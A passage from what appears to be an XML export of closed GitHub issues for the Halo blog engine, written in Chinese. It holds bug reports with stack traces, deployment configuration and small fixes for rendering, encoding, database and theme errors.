org.xnio.nio.QueuedNioTcpServer.handleReady(QueuedNioTcpServer.java:467) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]         at org.xnio.nio.QueuedNioTcpServerHandle.handleReady(QueuedNioTcpServerHandle.java:38) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]         at org.xnio.nio.WorkerThread.run(WorkerThread.java:561) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final] ```  进一步造成博客的 Socket 连接关闭，博客无法访问。</body>
		<created>2019-11-19 09:45:49</created>
		<closed>2019-11-19 13:52:18</closed>
	</bug>
	<bug>
		<id>384</id>
		<title>文章展示时@[TOC]自动生产目录无效，后台编辑时右边框预览是有的</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  文章展示时@[TOC]自动生产目录无效，后台编辑时右边框预览是有的  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持 </body>
		<created>2019-11-17 17:58:58</created>
		<closed>2019-11-30 15:09:33</closed>
	</bug>
	<bug>
		<id>381</id>
		<title>logs表中没有记录IP地址。</title>
		<body>在记录用户的操作日志时，能否同时记录下用户的IP，在数据库的LOGS表中。  ![2019-11-16_15-15-15](https://user-images.githubusercontent.com/37702397/68989596-058c2f80-0884-11ea-905f-1953b3fc6de5.png)   &lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/guide) - [ ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [ ] [其他 Issues](https://github.com/halo-dev/halo-admin/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [ ] BUG 反馈 - [x] 添加新的特性或者功能 - [x] 请求技术支持 </body>
		<created>2019-11-16 07:16:16</created>
		<closed>2019-11-16 13:02:25</closed>
	</bug>
	<bug>
		<id>377</id>
		<title>docker使用mysql数据库部署出现问题</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能  ![a](https://user-images.githubusercontent.com/42808522/68820076-23f7fc80-06c5-11ea-8a06-ffb532861b3c.png)  根据安装指南操作出现这个问题，一开始以为是数据库的问题，切换成h2数据库之后，还是会出现同样的问题。</body>
		<created>2019-11-14 01:59:38</created>
		<closed>2019-11-14 11:42:21</closed>
	</bug>
	<bug>
		<id>370</id>
		<title>查询不存在的标签时服务器返回500问题</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [ ] [Halo 使用文档](https://halo.run/docs) - [ ] [Halo 论坛](https://bbs.halo.run) - [ ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持   访问不存在的博客类别，如xxx.com/categories/notexist 服务会抛出NotFoundException，但是没有进行相应处理，导致服务器返回的是500 Internal Server Error。</body>
		<created>2019-11-08 14:35:38</created>
		<closed>2019-11-09 08:48:02</closed>
	</bug>
	<bug>
		<id>356</id>
		<title>附件上传的media-type字段需要调整大小</title>
		<body>media_type字段50字符，少数文件类型超出50抛异常 如： ```shell Caused by: org.h2.jdbc.JdbcSQLDataException: Value too long for column """MEDIA_TYPE"" VARCHAR(50) NOT NULL": "'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' (65)"; SQL statement:  ``` 我设置为100 ```sql ALTER TABLE attachments MODIFY media_type VARCHAR(100) NOT NULL; ```</body>
		<created>2019-10-31 07:02:38</created>
		<closed>2019-10-31 11:21:13</closed>
	</bug>
	<bug>
		<id>340</id>
		<title>附件上传.ico格式文件错误</title>
		<body>**我要申请**  (标注`[ ]`为`[x]`)  - [x ] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持 V1.1.1 ![image](https://user-images.githubusercontent.com/3981276/66968999-4264db00-f0ba-11e9-94b8-bce9d2137614.png) </body>
		<created>2019-10-17 00:44:02</created>
		<closed>2019-11-03 06:48:50</closed>
	</bug>
	<bug>
		<id>339</id>
		<title>添加分类时的大小写问题</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  ## 问题  查找时，name 区分了大小写  ``` categoryService.getByName(ele); ```  但是插入时，如果已经有 Java 分类，再插入 java 就会插入失败  ``` categoryService.create(category); ```  ``` Caused by: org.hibernate.exception.ConstraintViolationException: could not execute statement  Caused by: org.h2.jdbc.JdbcSQLIntegrityConstraintViolationException: Unique index or primary key violation: "PUBLIC.UK_DNAUIRMERR5VJTQ6IH53J8RJ5_INDEX_6 ON PUBLIC.CATEGORIES(SLUG_NAME) VALUES 1"; SQL statement: ```  ### 出现场景  1. md 导入工具解析元数据 2. 编辑文章页，添加分类 </body>
		<created>2019-10-16 09:58:03</created>
		<closed>2019-11-22 14:45:36</closed>
	</bug>
	<bug>
		<id>335</id>
		<title>1.1.1 版本vno主题无法使用</title>
		<body>**我确定我已经查看了:**   - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**   - [x] BUG 反馈  1. vno主题的博客内容打不开 ```500 Internal Server Error. Request processing failed; nested exception is freemarker.core.InvalidReferenceException: The following has evaluated to null or missing: ==&gt; options.subtitle [in template "themes/onevcat_vno/_includes/side-panel.ftl" at line 14, column 70] ```  2. vno博客的预览界面也报出相同错误 </body>
		<created>2019-10-14 12:33:38</created>
		<closed>2019-10-14 12:53:07</closed>
	</bug>
	<bug>
		<id>332</id>
		<title>后台文章管理页面缺陷</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  文章标签过长，会导致前端无法正确显示。另外全选按钮没有对应的全选操作  ![image](https://user-images.githubusercontent.com/22852751/66693999-afa2f580-ece1-11e9-8546-9f07f3ff1ed7.png) </body>
		<created>2019-10-12 03:17:06</created>
		<closed>2019-10-12 03:23:35</closed>
	</bug>
	<bug>
		<id>329</id>
		<title>文章标题中包含“/”文章将无法访问的bug</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [ x] [Halo 使用文档](https://halo.run/docs) - [x ] [Halo 论坛](https://bbs.halo.run) - [ x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x ] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x ] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  如果自动生成的中文标题中包含“/”，发表的文章将无法访问并提示404，建议自动生成的标题按当前时间戳生成  </body>
		<created>2019-10-05 10:30:55</created>
		<closed>2019-11-22 14:45:17</closed>
	</bug>
	<bug>
		<id>327</id>
		<title>图库页面图片连接丢失bug</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x ] [Halo 使用文档](https://halo.run/docs) - [x ] [Halo 论坛](https://bbs.halo.run) - [x ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x ] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持 photo页面中，使用中文文件名会导致作为图片浏览的html标签中 background-position: left center; background-image: url("");直接丢失其中的连接，还望告知是哪里出了问题。 </body>
		<created>2019-10-03 17:13:36</created>
		<closed>2019-12-27 10:28:53</closed>
	</bug>
	<bug>
		<id>317</id>
		<title>预览文章的标题不支持中文</title>
		<body>**我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  1.3.0开始的草稿文章预览功能的标题不支持中文，会被转成问号导致404，正式发布的文章标题是可以支持中文的</body>
		<created>2019-09-27 07:01:28</created>
		<closed>2019-11-22 14:55:49</closed>
	</bug>
	<bug>
		<id>310</id>
		<title>自动生成的sitemap中部分链接不正确</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  今天google发邮件说有5个链接出现了错误，我查看了一下sitemap.xml，其中的部分网址的确无法访问。 简单的测试了一下，好像只要链接中含有空格时就会出现这个问题，sitemap会用```+```代替，而实际的网址是用```%20```。  例如： sitemap中的描述： - https://x.medemede.cn/archives/sitmap+test - https://x.medemede.cn/archives/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Visual+Studio2019%E7%BC%96%E8%AF%91Darknet - https://x.medemede.cn/archives/YOLOv3%E5%AE%89%E8%A3%85with+cuda+opencv%EF%BC%8C%E8%A7%A3%E5%86%B3out+of+memory  实际网址： - https://x.medemede.cn/archives/sitmap%20test - https://x.medemede.cn/archives/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Visual%20Studio2019%E7%BC%96%E8%AF%91Darknet - https://x.medemede.cn/archives/YOLOv3%E5%AE%89%E8%A3%85with%20cuda%20opencv%EF%BC%8C%E8%A7%A3%E5%86%B3out%20of%20memory  sitemap.xml地址：https://x.medemede.cn/sitemap.xml   </body>
		<created>2019-09-25 07:29:17</created>
		<closed>2019-11-22 14:48:51</closed>
	</bug>
	<bug>
		<id>306</id>
		<title>完善私密文章的访问量统计</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持</body>
		<created>2019-09-23 06:57:00</created>
		<closed>2019-12-28 05:11:36</closed>
	</bug>
	<bug>
		<id>300</id>
		<title>文章展示表格出现问题</title>
		<body>![image](https://user-images.githubusercontent.com/34854930/65007279-37dae880-d938-11e9-8493-5c97827f24f2.png) 编辑的时候是这样写的，预览也是正常的，发布后就变成下面这个样子   ![image](https://user-images.githubusercontent.com/34854930/65007346-6a84e100-d938-11e9-8c42-956e2066bc96.png)    当我手动换行后就会变成这个样子。   ![image](https://user-images.githubusercontent.com/34854930/65007382-8b4d3680-d938-11e9-947b-cca6cbd5ad47.png)    环境： Server 版本：1.0.3 Admin 版本：1.0.3 数据库：MySQL 运行模式：production</body>
		<created>2019-09-17 02:48:19</created>
		<closed>2019-09-17 03:19:58</closed>
	</bug>
	<bug>
		<id>294</id>
		<title>生成缩略图OOM</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  ---  错误栈终于找到了，之前使用 `thumbnailator` 的时候由于没有打印出错误栈，仅仅是显示了 `Caused by: java.lang.OutOfMemoryError: Java heap space` 错误，导致无法精准定位问题。  完整错误栈如下：  ```java Caused by: java.lang.OutOfMemoryError: Java heap space         at java.desktop/java.awt.image.DataBufferByte.&lt;init&gt;(DataBufferByte.java:92) ~[na:na]         at java.desktop/java.awt.image.ComponentSampleModel.createDataBuffer(ComponentSampleModel.java:439) ~[na:na]         at java.desktop/java.awt.image.Raster.createWritableRaster(Raster.java:1005) ~[na:na]         at java.desktop/javax.imageio.ImageTypeSpecifier.createBufferedImage(ImageTypeSpecifier.java:1074) ~[na:na]         at java.desktop/javax.imageio.ImageReader.getDestination(ImageReader.java:2877) ~[na:na]         at java.desktop/com.sun.imageio.plugins.jpeg.JPEGImageReader.readInternal(JPEGImageReader.java:1142) ~[na:na]         at java.desktop/com.sun.imageio.plugins.jpeg.JPEGImageReader.read(JPEGImageReader.java:1110) ~[na:na]         at java.desktop/javax.imageio.ImageIO.read(ImageIO.java:1468) ~[na:na]         at java.desktop/javax.imageio.ImageIO.read(ImageIO.java:1315) ~[na:na]         at cn.hutool.core.img.ImgUtil.read(ImgUtil.java:1559) ~[hutool-core-4.6.3.jar!/:na]         at cn.hutool.core.img.ImgUtil.scale(ImgUtil.java:74) ~[hutool-core-4.6.3.jar!/:na]         at run.halo.app.handler.file.LocalFileHandler.generateThumbnail(LocalFileHandler.java:230) ~[classes!/:1.1.0-beta.3]         at run.halo.app.handler.file.LocalFileHandler.upload(LocalFileHandler.java:155) ~[classes!/:1.1.0-beta.3]         at run.halo.app.handler.file.FileHandlers.upload(FileHandlers.java:54) ~[classes!/:1.1.0-beta.3]         at run.halo.app.service.impl.AttachmentServiceImpl.upload(AttachmentServiceImpl.java:105) ~[classes!/:1.1.0-beta.3]         at run.halo.app.service.impl.AttachmentServiceImpl$$FastClassBySpringCGLIB$$2d9c80b9.invoke(&lt;generated&gt;) ~[classes!/:1.1.0-beta.3]         at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:684) ~[spring-aop-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]         at run.halo.app.service.impl.AttachmentServiceImpl$$EnhancerBySpringCGLIB$$f033e75e.upload(&lt;generated&gt;) ~[classes!/:1.1.0-beta.3]         at run.halo.app.controller.admin.api.AttachmentController.uploadAttachment(AttachmentController.java:86) ~[classes!/:1.1.0-beta.3]         at run.halo.app.controller.admin.api.AttachmentController$$FastClassBySpringCGLIB$$8f3ff968.invoke(&lt;generated&gt;) ~[classes!/:1.1.0-beta.3]         at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:749) ~[spring-aop-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]         at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]         at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:41) ~[classes!/:1.1.0-beta.3]         at jdk.internal.reflect.GeneratedMethodAccessor240.invoke(Unknown Source) ~[na:na]         at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]         at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na]         at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]         at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]         at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.1.9.RELEASE.jar!/:5.1.9.RELEASE] ```</body>
		<created>2019-09-09 15:53:15</created>
		<closed>2019-09-14 03:12:15</closed>
	</bug>
	<bug>
		<id>290</id>
		<title>1.1.0-beta.3几个问题</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  1. pingshu主题的博客内容打不开，报错内容为： ``` 500 Internal Server Error. Request processing failed; nested exception is freemarker.core.InvalidReferenceException: The following has evaluated to null or missing: ==&gt; comments [in template "themes/chakhsu_pinghsu/post.ftl" at line 50, column 52] ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use &lt;#if myOptionalVar??&gt;when-present&lt;#else&gt;when-missing. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ---- ---- FTL stack trace ("~" means nesting-related): - Failed at: ${comments.totalElements} [in template "themes/chakhsu_pinghsu/post.ftl" at line 50, column 50] ---- ```  2. 博客编辑界面的预览功能报错： ```json { "status": 401, "message": "You have to login before accessing admin api", "devMessage": null, "data": null } ```</body>
		<created>2019-09-07 02:52:54</created>
		<closed>2019-09-08 14:19:12</closed>
	</bug>
	<bug>
		<id>283</id>
		<title>1.1.0-beta.1 使用docker-compose无法部署</title>
		<body>升级到1.1.0-beta.1后，使用同样的docker-compose配置文件部署会报错，退回到1.0.3可以正常部署 ``` Invalid initial heap size: -Xms${JVM_XMS} Error: Could not create the Java Virtual Machine. Error: A fatal exception has occurred. Program will exit. ```  我的docker-compose.yml的halo部分： ```yml halo:     restart: always     image: ruibaby/halo:1.1.0-beta.1.dev     container_name: halo     ports:       - 11111:11111     environment:       - MAX_UPLOAD_SIZE=10m       - JVM_XMS=256m       - JVM_XMX=512m     depends_on:       - mysql     volumes:       - ./data:/root/.halo ```</body>
		<created>2019-08-29 01:26:30</created>
		<closed>2019-09-03 13:42:47</closed>
	</bug>
	<bug>
		<id>280</id>
		<title>文章标题不能带有英文句号.</title>
		<body>文章标题不能带有英文句号.,如果有一个或者多个,会报错404,估计原因是数据库用了.作为层级分割,来自http://www.lt8.top      的博客</body>
		<created>2019-08-19 09:38:39</created>
		<closed>2019-09-03 02:12:13</closed>
	</bug>
	<bug>
		<id>278</id>
		<title>文章设置中移除缩略图失效</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  ----  后台管理页面，文章设置中，有缩略图的文章，移除缩略图，保存不生效（缩略图删不了） 猜测：移除后，传的字段为 `null`，后台更新的时候忽略了该字段</body>
		<created>2019-08-15 13:02:30</created>
		<closed>2019-09-03 13:31:08</closed>
	</bug>
	<bug>
		<id>275</id>
		<title>最新评论接口的数据中包含了一些未审核通过的评论</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  ---  最新评论的接口应该屏蔽掉未审核的评论。</body>
		<created>2019-08-09 11:55:22</created>
		<closed>2019-09-05 13:37:05</closed>
	</bug>
	<bug>
		<id>272</id>
		<title>上传本地Markdown文章失败</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  --- # 运行环境  ## 设备  Raspberry Pi  ## Java 环境  ```bash java -version openjdk version "1.8.0_212" OpenJDK Runtime Environment (build 1.8.0_212-8u212-b01-1+rpi1-b01) OpenJDK Client VM (build 25.212-b01, mixed mode) ```  # 具体错误栈信息如下 ```java 2019-08-07 17:33:34.972 ERROR 17565 --- [XNIO-1 task-17] r.h.a.c.base.ControllerExceptionHandler  : Captured an exception  java.lang.NullPointerException: null at com.vladsch.flexmark.util.sequence.SegmentedSequence.of(SegmentedSequence.java:122) ~[flexmark-util-0.42.12.jar!/:na] at com.vladsch.flexmark.parser.core.FencedCodeBlockParser.closeBlock(FencedCodeBlockParser.java:120) ~[flexmark-0.42.12.jar!/:na] at com.vladsch.flexmark.parser.internal.DocumentParser.finalize(DocumentParser.java:903) ~[flexmark-0.42.12.jar!/:na] at com.vladsch.flexmark.parser.internal.DocumentParser.incorporateLine(DocumentParser.java:640) ~[flexmark-0.42.12.jar!/:na] at com.vladsch.flexmark.parser.internal.DocumentParser.parse(DocumentParser.java:475) ~[flexmark-0.42.12.jar!/:na] at com.vladsch.flexmark.parser.Parser.parse(Parser.java:380) ~[flexmark-0.42.12.jar!/:na] at run.halo.app.utils.MarkdownUtils.renderHtml(MarkdownUtils.java:76) ~[classes!/:1.0.3] at run.halo.app.service.impl.PostServiceImpl.importMarkdown(PostServiceImpl.java:284) ~[classes!/:1.0.3] at run.halo.app.service.impl.PostServiceImpl$$FastClassBySpringCGLIB$$f48dfa5c.invoke(&lt;generated&gt;) ~[classes!/:1.0.3] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:684) ~[spring-aop-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at run.halo.app.service.impl.PostServiceImpl$$EnhancerBySpringCGLIB$$24a76f44.importMarkdown(&lt;generated&gt;) ~[classes!/:1.0.3] at run.halo.app.service.impl.BackupServiceImpl.importMarkdowns(BackupServiceImpl.java:36) ~[classes!/:1.0.3] at run.halo.app.controller.admin.api.BackupController.backupMarkdowns(BackupController.java:37) ~[classes!/:1.0.3] at sun.reflect.GeneratedMethodAccessor514.invoke(Unknown Source) ~[na:na] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_212] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_212] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:189) ~[spring-web-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:102) ~[spring-webmvc-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) ~[spring-webmvc-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:800) ~[spring-webmvc-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1038) ~[spring-webmvc-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) 